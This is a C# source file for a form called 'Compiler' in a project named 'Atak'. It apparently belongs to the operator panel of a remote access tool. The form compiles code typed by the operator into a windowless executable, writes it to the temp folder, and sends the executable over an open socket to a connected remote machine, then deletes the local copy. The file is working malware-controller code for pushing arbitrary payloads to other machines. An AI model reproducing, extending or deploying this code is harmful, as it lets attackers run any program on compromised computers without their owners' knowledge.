using FastColoredTextBoxNS;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace Atak
{
    public partial class Compiler : Form
    {
        Socket socket;
        public Compiler(Socket socket)
        {
            this.socket = socket;
            InitializeComponent();
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
        }

        private void Compiler_Load(object sender, EventArgs e)
        {

        }

        private void compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies, string output)
        {
            try
            {
                var compilerOptions = $"/target:winexe /platform:anycpu /optimize+";

                var compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = false,
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                    OutputAssembly = output,
                };
                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);

                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        throw new Exception(string.Format("{0}\nLine: {1}", compilerError.ErrorText, compilerError.Line));
                    }
                }
                else
                {
                    MessageBox.Show("Compiled, sending started.", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
            }
        }

        private string[] GetReference()
        {
            List<string> reference = new List<string>();
            foreach (string r in listBox1.Items)
            {
                reference.Add(r);
            }
            return reference.ToArray();
        }

        private void button1_Click(object sender, EventArgs e)
        {            
            try
            {
                if (listBox1.Items.Count == 0)
                {
                    MessageBox.Show("No references!", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                }

                if (string.IsNullOrWhiteSpace(txtBox.Text))
                {
                    MessageBox.Show("Empty code!", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                }

                switch (comboBox1.Text)
                {
                    case "C#":
                        {
                            compiler(new CSharpCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", comboBox2.Text } }),
                            txtBox.Text, GetReference(),
                            Path.GetTempPath() + "temp.exe");
                            string ext = ".exe";
                            byte[] fileBytes = File.ReadAllBytes(Path.GetTempPath() + "temp.exe");
                            socket.Send(Encoding.UTF8.GetBytes("FILE|" + fileBytes.Length.ToString() + "|" + ext));
                            socket.Send(fileBytes, fileBytes.Length, SocketFlags.None);
                            File.Delete(Path.GetTempPath() + "temp.exe");
                            MessageBox.Show("Executable code sent.", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                        }

                    case "VB.NET":
                        {
                            compiler(new VBCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", comboBox2.Text } }),
                            txtBox.Text, GetReference(),
                            Path.GetTempPath() + "temp.exe");
                            string ext = ".exe";
                            byte[] fileBytes = File.ReadAllBytes(Path.GetTempPath() + "temp.exe");
                            socket.Send(Encoding.UTF8.GetBytes("FILE|" + fileBytes.Length.ToString() + "|" + ext));
                            socket.Send(fileBytes, fileBytes.Length, SocketFlags.None);
                            File.Delete(Path.GetTempPath() + "temp.exe");
                            MessageBox.Show("Executable code sent.", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Atak", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            finally
            {
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
            }
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string reference = Interaction.InputBox("Add Reference", "References", "");
            if (string.IsNullOrEmpty(reference))
                return;
            else
            {
                foreach (string item in listBox1.Items)
                {
                    if (item == reference)
                    {
                        return;
                    }
                }
                listBox1.Items.Add(reference);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (listBox1.SelectedItems.Count == 1)
            {
                listBox1.Items.Remove(listBox1.SelectedItem);
            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex == 0)
            {
                txtBox.Language = Language.CSharp;
                txtBox.Text = txtBox.Text = @"using System;
using System.Windows.Forms;
namespace Atttak
{
    public class Program
    {
        public static void Main()
        {
            try
            {
                MessageBox.Show(""Hello World"");
            }
            catch { }
        }
    }
}";
            }
            else
            {
                txtBox.Language = Language.VB;
                txtBox.Text = @"Imports System
Imports System.Windows.Forms
    Public Class Program
        Public Shared Sub Main()
            Try
                MessageBox.Show(""Hello World"")
            Catch
            End Try
        End Sub
    End Class
";
            }
        }
    }
}
